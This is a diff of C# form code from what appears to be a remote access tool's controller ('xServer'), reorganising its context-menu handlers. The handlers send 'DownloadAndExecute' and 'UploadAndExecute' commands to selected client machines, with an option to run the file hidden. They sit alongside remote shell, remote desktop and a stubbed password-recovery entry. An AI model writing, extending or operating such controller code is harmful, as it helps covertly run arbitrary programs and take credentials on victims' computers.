@@ -382,14 +382,6 @@ namespace xServer.Forms
                 }
             }
             
-            private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    // TODO
-                }
-            }
-            
             private void ctxtRemoteShell_Click(object sender, EventArgs e)
             {
                 if (lstClients.SelectedItems.Count != 0)
@@ -457,28 +449,18 @@ namespace xServer.Forms
                     frmRDP.Show();
                 }
             }
-            #endregion
             
-            #region "Miscellaneous"
-            private void ctxtDownloadAndExecute_Click(object sender, EventArgs e)
+            private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
             {
                 if (lstClients.SelectedItems.Count != 0)
                 {
-                    using (var frm = new FrmDownloadAndExecute(lstClients.SelectedItems.Count))
-                    {
-                        if (frm.ShowDialog() == DialogResult.OK)
-                        {
-                            foreach (ListViewItem lvi in lstClients.SelectedItems)
-                            {
-                                Client c = (Client)lvi.Tag;
-                                new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL, DownloadAndExecute.RunHidden).Execute(c);
-                            }
-                        }
-                    }
+                    // TODO
                 }
             }
+            #endregion
             
-            private void ctxtUploadAndExecute_Click(object sender, EventArgs e)
+            #region "Miscellaneous"
+            private void ctxtLocalFile_Click(object sender, EventArgs e)
             {
                 if (lstClients.SelectedItems.Count != 0)
                 {
@@ -491,6 +473,24 @@ namespace xServer.Forms
                                 Client c = (Client)lvi.Tag;
                                 new Core.Packets.ServerPackets.UploadAndExecute(UploadAndExecute.File, UploadAndExecute.FileName, UploadAndExecute.RunHidden).Execute(c);
                                 CommandHandler.HandleStatus(c, new Core.Packets.ClientPackets.Status("Uploading file..."), this);
+                            }
+                        }
+                    }
+                }
+            }
+            
+            private void ctxtWebFile_Click(object sender, EventArgs e)
+            {
+                if (lstClients.SelectedItems.Count != 0)
+                {
+                    using (var frm = new FrmDownloadAndExecute(lstClients.SelectedItems.Count))
+                    {
+                        if (frm.ShowDialog() == DialogResult.OK)
+                        {
+                            foreach (ListViewItem lvi in lstClients.SelectedItems)
+                            {
+                                Client c = (Client)lvi.Tag;
+                                new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL, DownloadAndExecute.RunHidden).Execute(c);
                             }
                         }
                     }
